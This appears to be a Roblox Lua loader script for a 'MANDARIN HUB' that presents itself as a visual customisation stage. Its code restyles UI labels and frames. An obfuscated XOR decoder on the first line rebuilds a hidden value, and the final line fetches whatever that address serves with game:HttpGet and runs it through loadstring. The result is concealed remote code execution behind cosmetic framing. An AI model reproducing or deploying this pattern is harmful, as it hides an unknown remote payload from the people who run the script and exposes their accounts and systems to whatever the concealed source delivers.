
--[[ STAGE 2: VISUAL CORE ]]
local GCsIffebbhGMasSpmZHHv0="\231\006\009\008\010\196\188\191\023\011\028\036\024\020\018\022\217\033\032\037\230\060\050\071\242\002\005\098\083\090\091\074\095"local YNNhgUWUcdle=42 local pLjKDElKvb155lb4gxS=155 local WzHvvX8BxA4bvkyuVy=0 local gfy4zJo5eY7OFf8F1PTO=3 local vB8Jsz4LPQv9UPa8ep71CM=7 local hFR4MZUAevPInw=false local XX4ZSiJqed3j4Eh77D2=bit32 and bit32.bxor if not XX4ZSiJqed3j4Eh77D2 then XX4ZSiJqed3j4Eh77D2=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local UBMLvNl2HroD_0Il={}for rQe6aTQoT2OWiM6z0F3B=1,#GCsIffebbhGMasSpmZHHv0 do local lzsfpTBfquSCcmuVhoI_z=string.byte(GCsIffebbhGMasSpmZHHv0,rQe6aTQoT2OWiM6z0F3B)local wziILdeOJIxTWq=(pLjKDElKvb155lb4gxS+(rQe6aTQoT2OWiM6z0F3B*gfy4zJo5eY7OFf8F1PTO)+vB8Jsz4LPQv9UPa8ep71CM)%256 if WzHvvX8BxA4bvkyuVy==0 then lzsfpTBfquSCcmuVhoI_z=(lzsfpTBfquSCcmuVhoI_z-wziILdeOJIxTWq)%256 UBMLvNl2HroD_0Il[rQe6aTQoT2OWiM6z0F3B]=string.char(XX4ZSiJqed3j4Eh77D2(lzsfpTBfquSCcmuVhoI_z,YNNhgUWUcdle))else lzsfpTBfquSCcmuVhoI_z=XX4ZSiJqed3j4Eh77D2(lzsfpTBfquSCcmuVhoI_z,YNNhgUWUcdle)UBMLvNl2HroD_0Il[rQe6aTQoT2OWiM6z0F3B]=string.char((lzsfpTBfquSCcmuVhoI_z-wziILdeOJIxTWq)%256)end end local rRrs84J_Cyw2=table.concat(UBMLvNl2HroD_0Il)if hFR4MZUAevPInw then rRrs84J_Cyw2=string.reverse(rRrs84J_Cyw2)end local GRPUygvueuECY=rRrs84J_Cyw2
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(GRPUygvueuECY))()
